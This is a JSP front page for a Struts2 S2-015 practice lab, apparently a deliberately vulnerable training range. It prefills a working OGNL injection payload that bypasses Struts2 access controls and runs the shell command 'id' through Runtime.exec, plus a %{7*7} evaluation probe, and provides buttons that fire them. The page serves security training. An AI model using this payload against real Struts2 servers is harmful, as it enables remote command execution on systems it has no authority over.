<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-015 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; width: 100%; box-sizing: border-box; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-015 演示靶场</h1>
        <p>这个模块同时包含文档里提到的两种 S2-015 场景：通配符结果映射 <code>/{1}.jsp</code>，以及 result 参数中使用 <code>${message}</code> 的二次引用执行。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="runWildcard()">通配符场景回显 id</button>
            <button type="button" class="preset-btn" onclick="runHeader()">Header 场景执行 7*7</button>
        </div>
        <div class="field">
            <label for="wildcardBox">通配符 Action 名称 Payload</label>
            <textarea id="wildcardBox">${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[256],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#d)),#out.close()}</textarea>
        </div>
        <div class="field">
            <label for="messageBox">Header 场景 message 参数</label>
            <textarea id="messageBox">%{7*7}</textarea>
        </div>
        <pre id="preview"></pre>
    </div>
</div>
<script>
    function strictEncode(value) {
        return encodeURIComponent(value).replace(/[!'()*]/g, function(char) {
            return '%' + char.charCodeAt(0).toString(16).toUpperCase();
        });
    }

    function wildcardUrl() {
        return strictEncode(document.getElementById('wildcardBox').value) + '.action';
    }

    function headerUrl() {
        return 'param.action?message=' + strictEncode(document.getElementById('messageBox').value);
    }

    function refreshPreview() {
        document.getElementById('preview').textContent =
            'Wildcard: http://宿主机IP:9958/' + wildcardUrl() + '\n' +
            'Header:   http://宿主机IP:9958/' + headerUrl();
    }

    function runWildcard() {
        location.href = wildcardUrl();
    }

    function runHeader() {
        location.href = headerUrl();
    }

    document.getElementById('wildcardBox').addEventListener('input', refreshPreview);
    document.getElementById('messageBox').addEventListener('input', refreshPreview);
    refreshPreview();
</script>
</body>
</html>
